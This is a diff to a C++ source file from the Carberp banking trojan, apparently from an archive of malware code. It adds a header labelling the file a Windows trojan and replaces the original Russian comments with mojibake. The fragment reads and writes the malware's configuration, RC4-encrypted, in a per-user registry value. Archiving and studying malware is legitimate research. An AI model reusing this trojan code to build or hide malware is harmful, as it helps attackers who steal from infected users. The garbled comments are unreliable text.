@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -47,7 +58,7 @@ void LocalSettings::getCurrent(SETTINGS *settings)
     {
       Mem::_copy(settings, data, sizeof(SETTINGS));
 
-      //Снимаем шифрование.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       {
         PESETTINGS pes;
         Core::getPeSettings(&pes);
@@ -80,15 +91,15 @@ bool LocalSettings::endReadWrite(SETTINGS *settings)
   bool r = false;
   if(settings != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)  
   {
-    //Шифруем.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       PESETTINGS pes;
       Core::getPeSettings(&pes);
       Crypt::_rc4(settings, sizeof(SETTINGS), &pes.rc4Key);
     }
     
-    //Сохраняем.
-    //FIXME: Рандомизировать длину.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, settings, sizeof(SETTINGS));
   }
   Sync::_freeMutex(lastReadWriteMutex);
